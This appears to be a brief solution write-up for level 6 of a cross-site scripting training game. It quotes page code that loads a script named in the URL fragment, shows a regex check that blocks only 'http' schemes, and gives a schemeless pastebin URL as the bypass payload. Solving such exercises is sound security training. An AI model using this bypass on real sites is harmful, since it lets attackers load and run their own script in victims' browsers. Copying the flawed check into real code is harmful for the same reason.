## Level 6

Payload:

```
//pastebin.com/raw/tBq11R4J
```
    
In `index.html` line 45 the value after the hashbang is used:

```javascript
function getGadgetName() { 
      return window.location.hash.substr(1) || "/static/gadget.js";
    }
```

Insufficient validation happens in `index.html` line 21:

```javascript
if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
}
```

**URLs can be passed as schemaless!!**